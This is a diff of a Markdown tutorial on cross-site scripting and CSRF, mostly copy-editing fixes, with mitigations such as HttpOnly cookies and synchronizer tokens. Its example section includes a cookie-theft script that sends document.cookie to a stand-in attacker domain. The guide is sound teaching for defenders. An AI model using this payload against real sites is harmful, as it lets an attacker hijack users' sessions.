@@ -1,18 +1,21 @@
+Below are some of the common vulnerabilities faced by most enterprise web applications. 
+
 #Cross-Site Scripting:
 
 It is a type of vulnerability in which there is no proper input validation happening at client side which leads to injecting malicious script to web server which is reflected off from the server also called as reflected XSS. There can be other types of XSS attacks.
 
-In stored XSS the malicous script being sent from browser to server gets stored in the database as part of the request and then the attacker can retrieve back those malicious scripts from the web server which is highly vulnerable.
+In stored XSS, the malicous script being sent from browser to server gets stored in the database as part of the request and then the attacker can retrieve back those malicious scripts from the web server which is highly vulnerable.
 
 ##Types of XSS:
-Cross site scritping can be classifed into 3 major categories as listed below:
+Cross site scripting can be classifed into 3 major categories as listed below:
+
 * Stored/persistence XSS
 * Reflected XSS
 * Dom based XSS
 
 ###Stored XSS:
 
-It is also called as persistence XSS which is considered to be very harmful XSS vulnerability. This involves attacker injecting malicious javascript code in the application which results in storing of those scripts at web server database end. Whenever any other other tries to access data in the same application then the user gets stored malicious script by querying database which is highly vulnerable.
+It is also called persistence XSS and is considered to be a harmful XSS vulnerability. This involves attacker injecting malicious javascript code in the application which results in storing of those scripts on the database server. Whenever someone tries to access data in the same application, then the user gets the malicious script having queried the database which is highly vulnerable.
 
 Example :
 ```
@@ -23,12 +26,12 @@ Example :
 
 ###Reflected XSS:
 
-In this XSS vulnearbility the javascript injected to the application gets reflected back and gets executed in the victims browser hence revealing crucial information(session cookie) to the attacker. It is not considered to be highly vulnearble XSS type.
+In this XSS vulnerability, the javascript injected to the application gets reflected back and gets executed in the victims browser hence revealing crucial information (session cookie) to the attacker. It is not considered to be highly vulnearble XSS type.
 
 ###DOM based XSS:
 
-It is an advanced and most vulnerable type of XSS attack in which web applications client side scripts write user provided data to Document Object Model(DOM) and then this data is read fro the DOM by the web application and outputted to browser. If this data is not handled properly then attacker can inject maliciuos payload which gets stored as DOM and gets executed when data is read from DOM. It becomes highly vunerable for the web application and also web application firewall and security can not find anything in the server log. 
-Various object models which can be used to inject malicious payload are document.URL ,document.referrer ,document.location 
+It is an advanced and most vulnerable type of XSS attack in which web applications client side scripts write user provided data to Document Object Model(DOM) and then this data is read from the DOM by the web application and output to browser. If this data is not handled properly then attacker can inject maliciuos payload which gets stored as DOM and gets executed when data is read from DOM. It becomes highly vulnerable for the web application and also web application firewall and security cannot find anything in the server log. 
+Various object models which can be used to inject malicious payload are document.URL, document.referrer, document.location 
 
 ###Example of DOM based XSS attack :
 
@@ -58,7 +61,7 @@ Session hijacking, full control of page, malicious redirects
 ##Problem:
 User controlled data returned in HTTP response contains Javascript code.
 
-Below fig illustrates how simple XSS attack work:
+Below figure illustrates how simple XSS attack work:
 
 [here] (http://www.acunetix.com/wp-content/uploads/2012/10/how-xss-works-910x404.png)
 
@@ -69,7 +72,7 @@ Cookie theft example
 <script>document.location="http://evilwebsite.com"+document.cookie</script>
 ```
 
-In the above URL the attacker can retrieve session cookie from the URL by parsing the URL.
+In the above URL, the attacker can retrieve session cookie from the URL by parsing the URL.
 It usually uses Javascript to do bad things like :
 
 * Steal session cookies 
@@ -82,7 +85,7 @@ It usually uses Javascript to do bad things like :
 
 * Rewrite page on the fly
 
-##The main areas which needs to be sanitized before using in website are :
+##The main areas which needs to be sanitized before using in website are:
 
 * The URL
 * HTTP referrer objects
@@ -99,8 +102,8 @@ It usually uses Javascript to do bad things like :
 
 ##Sample code to prevent XSS:
 There are several ways of mitigating XSS attack in web appplicaitons.Some of them are listed below:
-* Use of HttpOnly flag - It is an additional flag included in a HTTP response header.This flag helps in reducing the risk of accessing the protected cookie at client side by the attacker (only if browser supports it).
-* Also we can add below code in the server side program to prevent persistent XSS attack
+* **Use of HttpOnly flag** - It is an additional flag included in a HTTP response header.This flag helps in reducing the risk of accessing the protected cookie at client side by the attacker (only if browser supports it).
+* Also we can add the code below in the server side program to prevent persistent XSS attack
 
 ###Example:
 
@@ -118,7 +121,7 @@ cookie.setHttpOnly(true);
 </session-config>
 ```
 
-* Some web application servers( i,e Tomcat), that implements JEE 5, and servlet container that implements Java Servlet 2.5 (part of the JEE 5), also allow creating HttpOnly session cookies .Below "useHttpOnly" attribute needs to be added in Context tag of context.xml file of Tomcat web server.
+* Some web application servers (i.e Tomcat), that implements JEE 5, and servlet container that implements Java Servlet 2.5 (part of the JEE 5), also allow creating HttpOnly session cookies .Below "useHttpOnly" attribute needs to be added in Context tag of context.xml file of Tomcat web server.
 ```
 
 <?xml version="1.0" encoding="UTF-8"?>
@@ -224,6 +227,6 @@ Using Synchronized Token Pattern
    ..
 </form>
 ```
-In this we make use of hidden fields to store CSRFtoken which has a common name as 'CSRFToken'. This CSRF token is generated using java.security.SecureRandom class which generates significantly long random token. Whenever user logs into the web application,this CSRFToken is attached to user's session alongwith the form and submits a non-imdempotent request to the web server then at server end the request handler matches these two tokens, one present in the session of the user and other in the request , if these tokens doesnot match then transaction will not be performed. Thus preventing Cross site request forgery attack to occur.
+In this, we make use of hidden fields to store CSRFtoken which has a common name as 'CSRFToken'. This CSRF token is generated using java.security.SecureRandom class which generates significantly long random token. Whenever user logs into the web application,this CSRFToken is attached to user's session alongwith the form and submits a non-imdempotent request to the web server then at server end the request handler matches these two tokens, one present in the session of the user and other in the request , if these tokens doesnot match then transaction will not be performed. Thus preventing Cross site request forgery attack to occur.
 
 
